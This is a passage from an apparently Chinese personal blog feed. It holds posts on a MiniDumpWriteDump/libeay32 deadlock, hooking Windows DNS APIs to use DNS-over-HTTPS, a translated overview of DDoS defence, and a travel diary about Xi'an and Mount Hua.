<p><div align="center"><br><img src="/img/dbghelp_suspend.png" align="center"><br></div><br>到这里死锁的原因已经很清晰了，整个过程如下：<br>1.主线程即0号线程触发异常被breakpad捕获，0号线程通过信号量控制4号线程生成dmp并等待4号线程执行完MiniDumpWriteDump释放信号量。<br>2.4号线程执行MiniDumpWriteDump，在执行过程中会挂起其他线程，挂起其他线程后会执行堆分配操作，这时会获取临界区0x03d20138。<br>3.此刻临界区0x03d20138正被12号线程占有，但是12号线程被4号线程不能释放临界区0x03d20138。</p>
<h2 id="0x02_再探死锁原因">0x02 再探死锁原因</h2><p>这就是一个经典的死锁问题，4号线程和12号线程相互等待，陷入死循环。本以为这时候分析完毕了，但是突然想到12号线程是libeay32的线程为什么会执行堆查询操作呢？直接Google搜一下，第一篇就是libeay32引发的死锁问题(请看第一个参考链接)。<br>帖子中说将openssl版本从原先的0.9.8g升到了目前最新的1.0.0e，问题就可以得到解决，看下我们的版本呢<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0:065&gt; lmvm libeay32</span><br><span class="line">start    end        module name</span><br><span class="line">6c330000 6c45e000   libeay32 C (export symbols)       libeay32.dll</span><br><span class="line">    Loaded symbol image file: libeay32.dll</span><br><span class="line">    Image name: libeay32.dll</span><br><span class="line">    Timestamp:        Fri Jul 24 12:42:20 2015 (55B1C22C)</span><br><span class="line">    CheckSum:         00000000</span><br><span class="line">    ImageSize:        0012E000</span><br><span class="line">    File version:     1.0.2.4</span><br><span class="line">    Product version:  1.0.2.4</span><br><span class="line">    File flags:       0 (Mask 3F)</span><br><span class="line">    File OS:          4 Unknown Win32</span><br><span class="line">    File type:        2.0 Dll</span><br><span class="line">    File date:        00000000.00000000</span><br><span class="line">    Translations:     0409.04b0</span><br><span class="line">    CompanyName:      The OpenSSL Project, http://www.openssl.org/</span><br><span class="line">    ProductName:      The OpenSSL Toolkit</span><br><span class="line">    InternalName:     libeay32</span><br><span class="line">    OriginalFilename: libeay32.dll</span><br><span class="line">    ProductVersion:   1.0.2d</span><br><span class="line">    FileVersion:      1.0.2d</span><br><span class="line">    FileDescription:  OpenSSL Shared Library</span><br><span class="line">    LegalCopyright:   Copyright  ?1998-2005 The OpenSSL Project. Copyright ?1995-1998 Eric A. Young, Tim J. Hudson. All rights reserved.</span><br></pre></td></tr></table></figure></p>
<p>版本已经是1.0.2d了，比帖子中说的版本还新，不行下份源码来看看，在openssl-1.0.2d\crypto\rand\rand_win.c int RAND_poll(void)函数中可以找到相关代码，从相关注释可以看出遍历堆的作用是生成随机数因子，同时RAND_poll中也包含其他几种方式生成随机数因子，如CryptoAPI相关接口，生成成功后通过RAND_add加入到随机数池中。<br>那是不是利用堆遍历生成随机数的方式可以直接删除掉呢？ 本身堆遍历性能就不好，还会增加死锁风险。<br>openssl被应用非常广泛，我们看下行业大厂是怎么用的呢，看线Tim中使用的libeay32.dll，果然利用堆遍历生成随机数的方式被删除掉了，不过删除的不彻底，白Loadlibrary/FreeLibrary kernal32.dll一次。</p>
<h2 id="0x03_解决方案">0x03 解决方案</h2><p>1.彻底解决方案：微软本身就不建议在进程内生成dmp，并说明了进程内生成dmp最大的潜在风险就是死锁。因此使用进程外生成dump方式是最彻底的解决方案，breadpad本身就支持c/s方式生成dmp。<br>2.缓解方案：删除libeay32!RAND_poll堆遍历生成随机数的方案，这样可以减小死锁的风险，该方案本身性能就不好。<br>3.终极解决方案：提高代码质量，我不异常不崩溃就不会写dmp，也就不死锁了，当然这是理想状态，是不可能的。</p>
<h2 id="0x04_参考链接">0x04 参考链接</h2><p>[1] <a href="https://blog.csdn.net/xxin_w/article/details/8805050" target="_blank" rel="external">openssl中libeay32!RAND_poll引发的死锁</a><br>[2] <a href="https://ftp.openssl.org/source/old/1.0.2/" target="_blank" rel="external">openssl 1.02 sourcecode</a><br>[3] <a href="https://docs.microsoft.com/en-us/windows/desktop/api/minidumpapiset/nf-minidumpapiset-minidumpwritedump" target="_blank" rel="external">MiniDumpWriteDump MSDN</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_问题介绍">0x00 问题介绍</h2><p>测试反馈测试过程中发现程序进程存在但是界面没加载出来，看现场很快发现是因为版本不匹配而导致程序崩溃，在写dmp的过程中死锁而导致进程卡死，由于程序是卡死而非退出守护进程也未重启程序，最终导致界面一直没加载出来。<br>现象就如上面所说，但是为什么写dmp为什么会导致程序死锁呢？<br>]]>
    
    </summary>
    
      <category term="MiniDumpWriteDump" scheme="http://www.youngroe.com/tags/MiniDumpWriteDump/"/>
    
      <category term="libeay32" scheme="http://www.youngroe.com/tags/libeay32/"/>
    
      <category term="Windows" scheme="http://www.youngroe.com/categories/Windows/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Windows客户端如何透明使用DNS-over-HTTPS]]></title>
    <link href="http://www.youngroe.com/2018/12/01/Windows/windows_client_dns_over_https/"/>
    <id>http://www.youngroe.com/2018/12/01/Windows/windows_client_dns_over_https/</id>
    <published>2018-12-01T12:13:53.000Z</published>
    <updated>2020-03-21T04:24:23.569Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_现有Windows客户端程序dns查询流程">0x00 现有Windows客户端程序dns查询流程</h2><ul>
<li>1.client通过系统api（gethostbyname/getaddrinfo/getaddrinfoex）发起查询dns请求</li>
<li>2.系统api会通过rpc查询本地服务dnscache是否有该host的缓存，如果缓存存在则直接返回返回host对应的ip地址，dns查询完成，如果没有则进入下一步</li>
<li>3.如果不存在该host的缓存，则首先会通过解析本地hosts文件看是否有该host对应的ip，如果存在，则直接返回该ip，否则进入下一步</li>
<li>4.如果本地hosts文件中没有该host的记录，则系统会通过发送dns udp包向本地dns服务器发起请求查询该host对应的ip，后面的dns查询过程如下图所示。<a id="more"></a>
</li>
</ul>
<div align="center"><br><img src="/img/localdns_query.jpg" alt="本地dns解析过程" align="center"><br></div>

<p>简单总结：<br>系统首先会通过本地缓存和hosts文件查询dns，如果缓存和hosts都没有对应的记录，会通过明文udp包向dns服务器查询。具体返回的结果受系统hosts文件及dns服务器影响较大。</p>
<h2 id="0x01_现有dns查询的缺点">0x01 现有dns查询的缺点</h2><p>通过第0x0部分对现有Windows客户端程序dns查询流程的介绍，可以分析出目前dns查询的一些缺陷和风险点。</p>
<p><strong>对使用客户端的用户：</strong><br>跟踪：由于现有dns数据包为端口固定的明文udp包，可以很容易在网络流量中区分dns流量，并解析其中查询的域名信息。这样一些别有用心的人就可以很容易通过解析dns流量分析一个人的浏览习惯，收集敏感信息，特别是大数据火热的今天。<br>欺骗攻击：从开始查询到最终获取到解析结果，现有的dns查询机制需要经历较多过程，由于是明文信息，攻击者可以在任意一个环节修改解析的结果，给一个错误的解析结果，可以阻止用户访问正确的网站或则引入到攻击者想让用户访问的仍以网站。</p>
<p><strong>对于开发客户端的厂商：</strong><br>网络劫持：对于一些页面广告或则其他有收益业务，可能会存在通过业务被dns劫持攻击风险，使业务不可访问或则被替换成其他页面。</p>
<h2 id="0x02_DNS_over_HTTPS是什么？">0x02 DNS over HTTPS是什么？</h2><p> 正式因为目前基于udp查询dns有各种安全缺陷，一些厂商提出了一种安全的dns查询方案DNS over Https，并且已经获得IETF支持，以RFC 8484名义发布。顾名思义DNS over HTTPS是一种通过https协议的Get请求获取域名解析的方案，简称DoH。由于基于http且与普通https请求共用443端口，如果正确部署服务器和客户端程序，理论上很难通过分析https包分析出客户端的域名请求查询结果，也不存在被篡改的风险。</p>
<h2 id="0x03_客户端程序如何透明切换到DoH">0x03 客户端程序如何透明切换到DoH</h2><p>既然DoH相较于基于udp包的dns查询有这么多的优势，那如何将现有的客户端程序切换到DoH呢？<br>我们很容易想到的过程是重写系统域名查询api，然后使用我们重写的api替换掉系统的api。但是这里会存在一个问题，目前的Windows客户端都会使用各种第三方网络库（libcurl、qt network等）及webview引擎（ieframe、libcef、qtwebview等），要想替换掉这些第三方库或则webview引擎中的系统api可能得花费很大的功夫，必须重写这部分代码，然后重新编译（某些库编译异常复杂如libcef）。并且还可能会存在一种情况是某些第三方库我们自己是没代码的，那这部分如何切换到DoH呢？<br>这里有一种不用重编译代码且可以对无代码的第三方库透明切换到使用DoH的简单方法，就是使用hook技术hook 系统dns查询相关系统api实现Windows客户端透明切换到DoH。可能需要hook的api如下：</p>
<table>
<thead>
<tr>
<th style="text-align:left">需要hook的api</th>
<th style="text-align:left">影响的其他api</th>
<th style="text-align:left">影响的第三方库</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">GetAddrinfoW</td>
<td style="text-align:left">GetAddrinfoA</td>
<td style="text-align:left">libcurl、qt network、libcef</td>
</tr>
<tr>
<td style="text-align:left">GetAddrinfoExW</td>
<td style="text-align:left">GetAddrinfoExA</td>
<td style="text-align:left">ieframe</td>
</tr>
</tbody>
</table>
<p>当然除了这两个api之外，Windows客户端程序可能还有一些使用其他api的情况（如gethostbyname/DnsQuery）,但是思路相同也是hook替换掉就可以了。<br>在hook函数的实现过程中可能还会遇到一些小问题，如GetAddrinfoW返回结果中的addrinfo内存分配问题。正常情况下返回结果中的addrinfo由GetAddrinfoW函数在其私有堆上分配，然后调用者使用完结果后使用freeaddrinfo释放，但是当我们自己实现的时候很难获取到私有堆的句柄，这样就没办法为addrinfo分配内存，如果使用new分配内存会在freeaddrinfo释放时错误产生问题。我实现的时候通过一个简单粗暴的方式是通过调用原始的GetAddrinfoW解析localhost然后直接使用结果中的addrinfo，因为是GetAddrinfoW分配，所以最后使用freeaddrinfo释放也没问题。<br>除此之外在实现过程中还需要考虑很多其他因素，如dns结果优选、dns缓存设计等软件结构问题，这些可以参考微博的HTTPDNSLib的实现。</p>
<h2 id="0x4_扩展，如何将操作系统切换到DoH">0x4 扩展，如何将操作系统切换到DoH</h2><p>在0x3部分实现单个客户端进程切换到DoH，那怎样将整个Windows系统切换到DoH？<br>其实同样也可以借鉴0x3的思路，替换系统dns服务的查询接口，实现应该是在一个系统服务进程中，具体没研究过。。。。。<br>不过以及有一个更简单的思路，实现一个udp转https的本地接口，然后将Windows网络设置中的dns服务器地址修改为这个本地接口地址，并且已经有人实现了，具体看参考链接4。</p>
<h2 id="0x05_参考链接">0x05 参考链接</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzA3ODgyNzcwMw==&amp;mid=201837080&amp;idx=1&amp;sn=b2a152b84df1c7dbd294ea66037cf262&amp;scene=2&amp;from=timeline&amp;isappinstalled=0#rd" target="_blank" rel="external">1.全局精确流量调度新思路-HttpDNS服务详解</a><br><a href="https://github.com/curl/curl/wiki/DNS-over-HTTPS" target="_blank" rel="external">2.DNS over HTTPS</a><br><a href="https://github.com/CNSRE/HTTPDNSLib" target="_blank" rel="external">3.HTTPDNSLib</a><br><a href="https://blog.3bro.info/archives/windows-dns-over-https/" target="_blank" rel="external">4.[教學] 如何透過 cloudflared 使用 DNS-over-HTTPS？（Windows 適用）</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_现有Windows客户端程序dns查询流程">0x00 现有Windows客户端程序dns查询流程</h2><ul>
<li>1.client通过系统api（gethostbyname/getaddrinfo/getaddrinfoex）发起查询dns请求</li>
<li>2.系统api会通过rpc查询本地服务dnscache是否有该host的缓存，如果缓存存在则直接返回返回host对应的ip地址，dns查询完成，如果没有则进入下一步</li>
<li>3.如果不存在该host的缓存，则首先会通过解析本地hosts文件看是否有该host对应的ip，如果存在，则直接返回该ip，否则进入下一步</li>
<li>4.如果本地hosts文件中没有该host的记录，则系统会通过发送dns udp包向本地dns服务器发起请求查询该host对应的ip，后面的dns查询过程如下图所示。]]>
    
    </summary>
    
      <category term="DNS-over-HTTPS" scheme="http://www.youngroe.com/tags/DNS-over-HTTPS/"/>
    
      <category term="getaddrinfo" scheme="http://www.youngroe.com/tags/getaddrinfo/"/>
    
      <category term="Windows" scheme="http://www.youngroe.com/categories/Windows/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[现代DDoS对抗技术概述（翻译/转载）]]></title>
    <link href="http://www.youngroe.com/2018/10/06/Cybersecurity/ddos-protection-techniques/"/>
    <id>http://www.youngroe.com/2018/10/06/Cybersecurity/ddos-protection-techniques/</id>
    <published>2018-10-06T04:45:15.000Z</published>
    <updated>2020-02-15T08:12:42.951Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_前言">0x00 前言</h2><p>想象一下有人不停的给你打电话，并且你没办法通过加黑名单的方式阻止他，因为他每次都使用了不同的电话号码。你可能会关掉电话，但是这样其他人也不能联系你了，常见的分布式拒绝服务攻击就和这种情况类似。<br>早在乔布斯推出第一部IPhone之前，<a href="https://en.wikipedia.org/wiki/Denial-of-service_attack" target="_blank" rel="external">DDos攻击</a>就已经出现了。因为DDos攻击攻击效果好、易于使用，并且很难追踪，现在依然非常受黑客喜欢。那么我们如何能够防御DDoS攻击呢？在DDOS攻击面前，你能确保为你的web服务器及应用提供高水平的防护么？在本文中我们将讨论如何防止DDoS攻击并介绍一些实践有效的DDoS保护和防御技术。<br><a id="more"></a></p>
<h2 id="0x01_DDoS攻击的类型和方法">0x01 DDoS攻击的类型和方法</h2><p>分布式拒绝服务攻击，简称DDoS是一种旨在使受害者的资源无法使用的协同攻击技术。它可以由一个团队黑客合作发起攻击，也可以由多个连接到互联网上的受害设备发起。这些受攻击者控制的设备通常也被称为僵尸网络。<br>很多工具都可以发起DDoS攻击，Trinoo, Stacheldraht, Shaft, Knight, Mstream等。有这么多易用的工具也是DDoS攻击如此流行的原因之一。</p>
<p><div align="center"><br><img src="/img/DDoS-quote-1.jpg" alt align="center"><br></div><br>一次DDoS攻击可能会持续几分钟到几个小时甚至几天。<a href="https://securelist.com/ddos-report-in-q1-2018/85373/" target="_blank" rel="external">卡巴斯基的报告显示</a>,最近几年持续最长的一次DDos攻击发生在2018年1月，总共持续了近300小时。<br>发起DDoS攻击有两种常见的方法：</p>
<ul>
<li><strong>利用软件漏洞</strong>:黑客可以对有已知或未知的漏洞的软件发送恶意数据包试图使受害者的系统瘫痪。</li>
<li><strong>消耗受害者主机资源或则网络带宽资源</strong>：黑客可以发送大量看起来合法的数据包，从而消耗受害者的网络带宽、CPU或内存直至受害系统无法正常处理合法用户的请求。</li>
</ul>
<p>尽管没有DDoS的标准分类，但是我们可以将他们分为四大类：</p>
<ul>
<li>Volumetric (volume-based)攻击</li>
<li>Protocol attacks</li>
<li>Application attacks</li>
<li>Zero-day attacks<br><div align="center"><br><img src="/img/DDoS-scheme.jpg" alt="DDos攻击常见分类" align="center"><br></div><br>现在我们具体看看每种类型的攻击。</li>
</ul>
<h3 id="Volumetric_attacks(大流量攻击)">Volumetric attacks(大流量攻击)</h3><p>Volumetric attacks试图通过大量的数据量大的网络数据包阻止系统正常的网络访问，通常借助僵尸网络及流量放大技术发起攻击，最常见的Volumetric attacks如下：</p>
<ul>
<li>UDP flood：黑客伪造UDP数据包中的源地址为受害主机发送到大量主机随机端口，这些主机会生成大量的应答包返回给受害主机。</li>
<li>ICMP flood：黑客通过大量的ICMP数据包或则ping，试图耗尽受害服务器的带宽。<br>在2018年，<a href="https://www.netscout.com/news/blog/security-17tbps-ddos-attack-makes-history" target="_blank" rel="external">Netscout</a>报告了迄今为止流量最大的一次DDoS攻击，一家美国服务提供商面临1.7 Tbps规模的reflection/amplification攻击。</li>
</ul>
<h3 id="Protocol_attacks（协议攻击）">Protocol attacks（协议攻击）</h3><p>根据Versign发布的2018年第一季度<a href="https://blog.verisign.com/security/q1-2018-ddos-trends-report-58-percent-of-attacks-employed-multiple-attack-types/" target="_blank" rel="external">DDoS攻击趋势报告</a>，Protocol attacks是通过利用网络协议工作机制弱点进行攻击的一种方式，是第二常见的DDoS攻击方式。常见的Protocol attacks攻击方式如下：</p>
<ul>
<li>SYN flood:黑客利用TCP协议三次握手协议缺陷。客户端发送SYN包给服务端，收到服务端的SYN-ACK包后，不发送ACK包给服务端。这样受害服务器上会留下大量未完成的SYN-ACK请求，从而使得受害服务器资源耗尽（CPU 满负载或内存不足），最终停止服务。</li>
<li>Ping of death:黑客通过ping命令发送超大的网络数据包导致受害主机系统服务中断或则崩溃。<br>SYN flood攻击是<a href="https://www.scmagazine.com/online-gambling-site-hit-by-five-vector-ddos-attack-peaking-at-100gbps/article/538551/" target="_blank" rel="external">2014年用于摧毁在线赌博网站最常使用的5种攻击向量之一</a>。</li>
</ul>
<h3 id="Application_attacks（应用层攻击）">Application attacks（应用层攻击）</h3><p>Application attacks利用了网络协议栈第6、7层中的弱点，针对特定的应用而不是整个服务器进行攻击，他们常见的目标端口和服务是DNS和HTTP服务。最常见的Application attacks攻击如下：</p>
<ul>
<li>HTTP flood：攻击者使用僵尸网络发起标准的大流量的GET和POST请求，由于这些请求看起来是合法的流量，因此检测HTTP flood攻击将是一个巨大的考验。</li>
<li>Slowloris:如名称一样，Slowloris攻击将使受害服务器响应异常缓慢。攻击者通过一定的时间间隔发送HTTP到受害服务器，服务器将一直等待这些请求这些不可能完的请求结束，最终这些不能完成的请求造成受害主机带宽耗尽，合法请求也不能正常到达。<br>2009年大选期间，高级黑客通过Slowloris关闭了伊朗政府网站。</li>
</ul>
<h3 id="Zero-day_DDoS_attacks">Zero-day DDoS attacks</h3><p>除了上面这些常见的攻击之外，还存在所谓的Zero-day DDoS attacks，黑客们利用未知的或则未修复的软件漏洞、不常见的攻击向量等完成攻击，因此这种攻击更难检测和防御。例如2016年，攻击者利用Lightweight Directory Access协议(LDAP) 发起了放大系数高达55倍的攻击。<br>下面我们谈谈如何检测DDoS攻击</p>
<h2 id="0x02_检测DDoS攻击">0x02 检测DDoS攻击</h2><p>虽然无法完全阻止DDoS攻击，但是有一些有效的做法可以帮助您检测并阻止已经在进行的DDoS攻击。</p>
<ul>
<li><p>异常检测：基于统计的模型和机器学习算法（如神经网络、决策树、邻近算法）可以用来分析网络流量，将网络流量区分为正常流量和DDoS攻击。同时你也可以通过其他网络性能因素，如CPU使用率/带宽使用等情况发现异常。</p>
</li>
<li><p>Knowledge-based方法：使用signature analysis，state transition analysis，expert systems，description scripts及 self-organizing maps方法，可以通过将流量与已知攻击的特定模式进行比较来检测DDoS。</p>
</li>
<li><p>访问控制和防火墙规则：除了入口/出口流量过滤之外，访问控制列表（ACL）和防火墙规则可用于增强网络流量的可观察性。特别是，您可以分析ACL日志了解哪些流量通过了你的网络设备。您还可以配置Web应用程序防火墙，以根据特定的规则，签名和模式阻止可疑的流量。</p>
</li>
<li><p>入侵检测和报警系统：入侵防御系统（IPS）和入侵检测系统（IDS）也提高的流量的可观察性。尽管误报率很高，但是IPS和IDS警报可以作为异常和潜在恶意流量的早期指示。</p>
</li>
</ul>
<p>尽早检测到正在进行的攻击可以帮助您减轻其后果。这样，你就可以采取适当的预防措施来防御DDoS攻击，使攻击者很难完全使你的服务器宕机。使用有效的反DDoS解决方案是这些措施之一。</p>
<h2 id="0x03_如何实现一个有效的DDoS对抗方案">0x03 如何实现一个有效的DDoS对抗方案</h2><p>无论您是要创建自己的反DDoS解决方案，还是要为Web应用程序寻求商业化的DDoS攻击防护系统，请牢记下面几点要求：</p>
<ul>
<li>混合DDoS检测方法:基于签名和基于异常的检测方法的组合是检测不同类型的DDoS攻击的关键。</li>
<li>防御网络栈中第3-4层及6-7层的攻击：如果你的防御方案可以检测并缓解所有三种主要的DDoS攻击，则是比较有效的：volumetric, application及protocol。</li>
<li>有效的流量过滤：DDoS保护的最大难题之一是如何有效区分恶意请求和合法请求。很难创建有效的过滤规则，因为DDoS攻击所涉及的大多数请求看起来都是来自合法用户。如速率限制之类的流行方法通常会产生很多误报，影响合法用户访问你的服务和应用程序。</li>
<li>SIEM集成:最重要的是您的反DDoS方案必须与SIEM系统很好地集成在一起，以便您可以收集有关攻击的信息，进行分析，然后使用它来改善DDoS防护方案，防止以后的同类攻击。<br>如果满足这些要求对您来说挑战太大，请考虑向专家寻求帮助。您需要一支经验丰富的开发人员团队，对网络安全，云服务和Web应用程序有深刻的了解，才能构建高质量的反DDoS解决方案。像这样的团队可能很难在内部组建团队，但是您始终可以寻求诸如Apriorit之类​​的第三方寻求帮助。<h3 id="阻止DDoS攻击">阻止DDoS攻击</h3><div align="center"><br><img src="/img/DDoS-img-quote-2.jpg" alt align="center"><br></div><br>即使您无法阻止DDoS攻击的发生，但也有能力使攻击者很难使你的应用或则服务宕机。这就是DDoS预防技术开始起作用的地方。您可以使用两种DDoS预防机制：常规防护机制和过滤技术。<br><strong>常规防护机制</strong>是一些常见的措施，可以帮助你的服务或则应用在面对DDoS攻击时更具灵活性，防护机制包括：</li>
<li>使用防火墙：尽管防火墙无法保护您的应用或服务器免受复杂的DDoS攻击，但它们仍可以有效地处理简单的攻击。</li>
<li>经常更新安全补丁：大多数攻击都针对特定的软件或硬件漏洞，因此，及时部署所有补丁程序可以帮助您降低遭受攻击的风险。</li>
<li>关闭不必要的服务：黑客能攻击到的应用和服务越少越好。确保禁用所有不需要和未使用的服务和应用，以提高网络的安全性。<br><strong>过滤技术</strong>使用不同的方法来过滤流量并阻止潜在的危险请求。这些技术包括入口/出口过滤，基于历史的IP过滤和基于路由器的数据包过滤。</li>
</ul>
<h2 id="0x04_保护Web应用免受DDoS攻击的最佳实践">0x04 保护Web应用免受DDoS攻击的最佳实践</h2><p>除了特定的DDoS预防机制之外，还有几种实践可以帮助您确保对Web应用程序的附加DDoS保护：</p>
<ul>
<li>减少可能被攻击脆弱点个数：除非确实需要，否则不要公开您的应用和资源。这样，您可以减少攻击者可能针对的基础架构中的薄弱环节攻击的风险。您还可以禁止直接访问数据库服务器及基础架构的其他关键资源的操作。</li>
<li>增加负载：考虑使用负载平衡器和CDN，通过均衡资源负载来减轻攻击的影响，以便即使在攻击过程中也可以保持服务可用状态。</li>
<li>选择靠谱的云服务提供商：寻找具有DDoS缓解策略的可信赖的云服务提供商。确保他们的策略可确保检测和缓解基于protocol，基于Volume和基于application的攻击。例如，一些云提供商使用anycasting网络在具有相同IP地址的多台计算机之间分配大量请求，缓解负载。</li>
<li>使用第三方DDoS缓解服务：考虑将Web应用程序的保护委托给第三方供应商。DDoS缓解服务甚至可以在恶意的流量到达受害者的网络之前就将其清除。您可以寻找一种基于DNS的服务，该服务将恶意流量重定向，或者寻找一种基于边界网关协议的解决方案来处理持续的攻击。</li>
</ul>
<h2 id="0x05_结论">0x05 结论</h2><p>黑客不断使用和改进DDoS攻击，以干扰某些服务、商业基础设施、大企业设置公共和非盈利组织的工作。攻击的主要目的是耗尽受害者的资源并因此使其提供的服务、应用程序或则网站崩溃。<br>虽然无法完全阻止DDoS攻击的发生，但是有一些有效的DDoS攻击保护技术和方法可以增强您的基础设施抵御DDoS攻击并减轻后果。</p>
<h2 id="0x06_关于DDoS攻击的其他资料">0x06 关于DDoS攻击的其他资料</h2><p><a href="https://www.apriorit.com/dev-blog/559-ddos-protection-techniques" target="_blank" rel="external">原文Modern DDoS Protection Techniques: An Overview</a><br><a href="https://www.hi-linux.com/posts/50873.html" target="_blank" rel="external">浅谈 DDoS 攻击与防御</a><br><a href="https://zoumiaojiang.com/article/common-web-security/" target="_blank" rel="external">常见 Web 安全攻防总结</a></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_前言">0x00 前言</h2><p>想象一下有人不停的给你打电话，并且你没办法通过加黑名单的方式阻止他，因为他每次都使用了不同的电话号码。你可能会关掉电话，但是这样其他人也不能联系你了，常见的分布式拒绝服务攻击就和这种情况类似。<br>早在乔布斯推出第一部IPhone之前，<a href="https://en.wikipedia.org/wiki/Denial-of-service_attack">DDos攻击</a>就已经出现了。因为DDos攻击攻击效果好、易于使用，并且很难追踪，现在依然非常受黑客喜欢。那么我们如何能够防御DDoS攻击呢？在DDOS攻击面前，你能确保为你的web服务器及应用提供高水平的防护么？在本文中我们将讨论如何防止DDoS攻击并介绍一些实践有效的DDoS保护和防御技术。<br>]]>
    
    </summary>
    
      <category term="DDoS" scheme="http://www.youngroe.com/tags/DDoS/"/>
    
      <category term="Cybersecurity" scheme="http://www.youngroe.com/categories/Cybersecurity/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[西安周末游]]></title>
    <link href="http://www.youngroe.com/2018/09/18/Life/xian/"/>
    <id>http://www.youngroe.com/2018/09/18/Life/xian/</id>
    <published>2018-09-18T04:11:15.000Z</published>
    <updated>2020-02-15T07:54:24.205Z</updated>
    <content type="html"><![CDATA[<p><em>说好的一人一篇游记，3年了，妹子的这篇游记终于出炉了</em><br>自打成都到西安通高铁，周围无数同事到西安打卡，我也是心心念念好久，一直没有机会，趁这次中级会计考完，特想放松放松。周一开会时坐旁边的同事去过西安，心血来潮，跟小哥哥商量去西安可好，小哥哥痛快答应，于是开启了这次断腿的旅程。</p>
<p><div align="center"><br><img src="/img/xian_1.png" align="center"><br></div><br><a id="more"></a></p>
<p><div align="center"><br><img src="/img/xian_2.jpg" align="center"><br></div><br>9月14日下午4点和小哥哥在成都东站汇合，坐动车直达华山北，定下了离华山不远的客栈，欢心雀跃，犹如刚从笼子里放出来。虽然晚上10点才到客栈，但客栈老板依然为我们耐心讲解了爬华山的各种途径，并比较优劣。由于整个行程都是提前规划好的，所以我们必须在第二天下午三点前下山，老板便建议我们最好坐缆车北上西下，到了北峰再爬山到东峰、南峰、再到西峰，可以体验爬山乐趣的同时还能轻松观景。当时我就好想像当年爬峨眉那样全靠自己爬个一天多好，缆车多浪费钱啊，还少看了这么多风景，但碍于时间有限，还是作罢，接受了老板中肯的建议。</p>
<p><div align="center"><br><img src="/img/xian_3.png" align="center"><br></div></p>
<p><div align="center"><br><img src="/img/xian_4.png" align="center"><br></div><br>9月15日7点半走出客栈看到遍地雨水，心都凉了半截，真想回去接着睡觉！其实周一订票时就看到天气预报说下雨，但我想的是天气预报肯定不准，我来了就会天晴，后来证明我只是想多了。。。。。。打车去北峰下坐大巴时，的士师傅告诉我们可以去买套票，就不用每次都排队，觉得说的有理，我们便买了套票，没有买保险。买票前的士师傅说今天下雨，西峰缆车可能会因为风大而停运，让我们西上北下，我们没听；买票后他说你们这个路线很好，说不定上去后还没有下雨Blablabla……虽然师傅翻脸比翻书还快，我们还是怀着不下雨的希望到了华山脚下。然而天不遂人愿，雨一直下，气氛很不融洽。披上雨衣坐上缆车到达北峰顶时，雨更大了，温度也更低了。周围全是雾，撒都看不到，躲雨时好多人已经放弃继续爬山了，小哥哥没放弃，催促我赶紧起身，不然下山搞不赢了。没有隔雨的鞋套，我的网面运动鞋好可怜。山上唯一的店铺没有鞋套，连塑料袋都没有，我埋怨一句你们怎么什么都没有，他说我这儿这么多东西，你偏要买我没有的。好吧，不理他。不知道哪儿找了两个塑料袋，穿在脚上我们就出发啦！看到了好几个华山论剑的石碑，短暂几分钟撕去雾纱的华山，雨中依然激情的喊山，一群拍抖音的小伙儿，一颗从未见过的大树。。。接着全是雾和雨，没有别的，还有一群披着雨衣坚强爬山的游客。跳过了东峰、南峰，到了西峰后才十一点半，索性听小哥哥的下山去西安吃顿肉，西峰的索道曲折蜿蜒，像是在游乐园，见到小哥哥在索道上紧张的样子，可爱极了，也原谅了他上次不陪我去坐激流勇进。华山，只能说来过。</p>
<p><div align="center"><br><img src="/img/xian_5.png" align="center"><br></div></p>
<p><div align="center"><br><img src="/img/xian_6.png" align="center"><br></div></p>
<p><div align="center"><br><img src="/img/xian_7.png" align="center"><br></div></p>
<p><div align="center"><br><img src="/img/xian_8.png" align="center"><br></div></p>
<p><div align="center"><br><img src="/img/xian_9.png" align="center"><br></div><br>下山坐动车到西安已经15:00了。西安地铁不接受微信支付买票，不接受10元以上纸币，纠结了半天，聪明的小哥哥发现支付宝上可以直接用地铁乘车码。找了家串串，是的我们到西安吃川坝子串串，食材很不新鲜，一点也不好吃，决定晚上还是吃西安当地“美食”吧。吃完午饭，准备下一站到回民街，走出地铁口便被古色古香的建筑吸引了，能从城市建设看出西安就是一座古城，拍照拍了好久。回民街特别热闹，和成都的宽窄巷子一样热闹，从这条街便可以看到西安到底有什么美食：肉夹馍、羊肉泡馍、胡辣汤。。。。。。因为整条街都在卖。本来看中了一家排长队的肉夹馍，但小哥哥硬是不让我买，走了一圈，什么没买就走了。不过幸好没买，不然不知等多久。说实话，四川人真的吃不惯西安的食物，肉夹馍感觉是肉  夹   膜，是分离的，胡辣汤好麻，其他的我也没吃了，也没有兴趣吃了。晚上六点半拖着疲惫的身体到了宾馆，不想再动了，腿已断，感觉不是自己的了，但还有大雁塔没去，休息了半个小时，冒着风雨，去了大雁塔。大雁塔感觉是公园，里面的建筑也是古色古香，屋顶全是金灿灿的灯光，一座白色的塔矗立在中间，真的很美，可惜塔被围墙围住进不去。</p>
<p><div align="center"><br><img src="/img/xian_10.png" align="center"><br></div></p>
<p><div align="center"><br><img src="/img/xian_11.png" align="center"><br></div></p>
<p><div align="center"><br><img src="/img/xian_14.jpg" width="600" height="400" align="center"><br></div><br>9月16日又比原定计划起晚了半个小时，火急火燎吃完早饭，生怕到了兵马俑就得坐车回成都了，哈哈哈。打车到火车站，再坐915就到了，很方便。火车站的城墙很美，兵马俑需要解说，听完导游的讲解，感觉兵马俑真是个浩大的工程，心生敬畏。</p>
<p><div align="center"><br><img src="/img/xian_12.png" align="center"><br></div></p>
